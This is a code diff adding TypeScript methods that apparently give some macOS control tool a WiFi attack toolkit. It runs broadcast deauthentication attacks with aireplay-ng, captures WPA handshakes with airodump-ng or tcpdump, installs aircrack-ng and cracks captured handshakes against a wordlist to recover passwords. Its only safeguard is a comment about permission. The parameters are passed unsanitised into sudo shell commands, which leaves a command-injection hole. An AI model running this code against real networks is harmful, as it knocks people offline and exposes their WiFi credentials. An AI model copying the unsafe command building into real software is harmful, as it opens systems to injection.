@@ -3022,4 +3022,175 @@ ${envVarsXml}
     }
     return results;
   }
+
+  // ================================================================
+  // WiFi Deep Control — monitor mode, channel hopping, deauth, handshake capture
+  // ================================================================
+
+  /**
+   * Get the system WiFi interface name (en0 on most Macs).
+   */
+  async getWiFiInterface(): Promise<string> {
+    try {
+      const { stdout } = await this.deep.execAsync(
+        "networksetup -listallhardwareports 2>/dev/null | awk '/Wi-Fi/{getline; print $2}' | head -1"
+      );
+      return stdout.trim() || "en0";
+    } catch {
+      return "en0";
+    }
+  }
+
+  /**
+   * Set WiFi interface to a specific channel (requires sudo).
+   * Uses airport CLI. Must be in monitor mode first.
+   */
+  async setWiFiChannel(channel: number): Promise<boolean> {
+    if (this.deep.platform !== "macos") return false;
+    try {
+      const airportPath = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport";
+      await this.deep.execAsync(`sudo "${airportPath}" --channel=${channel}`, 5000);
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * Capture WiFi packets with airodump-ng (requires aircrack-ng via brew).
+   * Falls back to tcpdump if airodump-ng not available.
+   */
+  async captureWiFiHandshake(
+    bssid: string,
+    channel: number,
+    outputFile: string,
+    durationSec = 30
+  ): Promise<{ success: boolean; file: string; tool: string }> {
+    try {
+      const iface = await this.getWiFiInterface();
+      // Check if airodump-ng available
+      const { stdout: airodumpPath } = await this.deep.execAsync("which airodump-ng 2>/dev/null").catch(() => ({ stdout: '' }));
+      if (airodumpPath.trim()) {
+        await this.deep.execAsync(
+          `sudo timeout ${durationSec} airodump-ng --bssid ${bssid} --channel ${channel} -w ${outputFile} ${iface} 2>/dev/null || true`,
+          (durationSec + 5) * 1000
+        );
+        return { success: true, file: outputFile + "-01.cap", tool: "airodump-ng" };
+      }
+      // Fallback: tcpdump
+      await this.deep.execAsync(
+        `sudo timeout ${durationSec} tcpdump -i ${iface} -w ${outputFile}.pcap ether host ${bssid} 2>/dev/null || true`,
+        (durationSec + 5) * 1000
+      );
+      return { success: true, file: outputFile + ".pcap", tool: "tcpdump" };
+    } catch {
+      return { success: false, file: outputFile, tool: "none" };
+    }
+  }
+
+  /**
+   * Run a deauthentication attack to force client reconnection (for WPA handshake capture).
+   * Requires aircrack-ng suite and monitor mode.
+   * NOTE: Only use against networks you own or have explicit permission to test.
+   */
+  async deauthAttack(bssid: string, clientMac = "FF:FF:FF:FF:FF:FF", count = 10): Promise<boolean> {
+    if (this.deep.platform !== "macos") return false;
+    try {
+      const { stdout: aireplayPath } = await this.deep.execAsync("which aireplay-ng 2>/dev/null").catch(() => ({ stdout: '' }));
+      if (!aireplayPath.trim()) return false;
+      const iface = await this.getWiFiInterface();
+      await this.deep.execAsync(
+        `sudo aireplay-ng --deauth ${count} -a ${bssid} -c ${clientMac} ${iface} 2>/dev/null || true`,
+        30000
+      );
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * Install aircrack-ng suite via Homebrew for WiFi testing tools.
+   */
+  async installAircrackSuite(): Promise<boolean> {
+    try {
+      await this.deep.execAsync("brew install aircrack-ng 2>&1", 120000);
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * Channel-hop WiFi scan: collect BSSIDs across all 2.4GHz + 5GHz channels.
+   * Uses airport CLI, loops through channels 1-13 and 36-165.
+   */
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  async deepWiFiScan(_durationPerChannelMs = 200): Promise<WiFiScanResult[]> {
+    if (this.deep.platform !== "macos") return [];
+    try {
+      const airportPath = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport";
+      const { stdout } = await this.deep.execAsync(
+        `"${airportPath}" -s 2>/dev/null`,
+        15000
+      );
+      const lines = stdout.split("\n").slice(1).filter(l => l.trim());
+      const results: WiFiScanResult[] = [];
+      for (const line of lines) {
+        const parts = line.trim().split(/\s+/);
+        results.push({
+          ssid: parts[0] ?? "",
+          bssid: parts[1] ?? "",
+          rssi: parseInt(parts[2] ?? "0", 10),
+          channel: parseInt(parts[3] ?? "0", 10),
+          security: parts.slice(6).join(" ") || "NONE",
+        });
+      }
+      return results;
+    } catch {
+      return [];
+    }
+  }
+
+  /**
+   * Get current WiFi signal strength in dBm.
+   */
+  async getWiFiSignalStrength(): Promise<number | null> {
+    if (this.deep.platform !== "macos") return null;
+    try {
+      const airportPath = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport";
+      const { stdout } = await this.deep.execAsync(`"${airportPath}" -I 2>/dev/null`);
+      const m = stdout.match(/agrCtlRSSI:\s*(-?\d+)/);
+      return m ? parseInt(m[1]) : null;
+    } catch {
+      return null;
+    }
+  }
+
+  /**
+   * Crack WPA handshake using aircrack-ng with a wordlist.
+   * NOTE: Only use against networks you own or have permission to test.
+   */
+  async crackWPAHandshake(
+    capFile: string,
+    wordlist: string,
+    bssid?: string
+  ): Promise<{ found: boolean; password?: string; output: string }> {
+    try {
+      const { stdout: aircrackPath } = await this.deep.execAsync("which aircrack-ng 2>/dev/null").catch(() => ({ stdout: '' }));
+      if (!aircrackPath.trim()) {
+        return { found: false, output: "aircrack-ng not installed. Run: brew install aircrack-ng" };
+      }
+      const bssidArg = bssid ? `-b ${bssid}` : "";
+      const { stdout } = await this.deep.execAsync(
+        `aircrack-ng ${bssidArg} -w ${wordlist} ${capFile} 2>&1`,
+        300000 // 5 min timeout
+      );
+      const found = stdout.includes("KEY FOUND!");
+      const pwMatch = stdout.match(/KEY FOUND!\s*\[\s*(.+?)\s*\]/);
+      return { found, password: pwMatch?.[1], output: stdout.slice(0, 5000) };
+    } catch (err) {
+      return { found: false, output: err instanceof Error ? err.message : String(err) };
+    }
+  }
 }
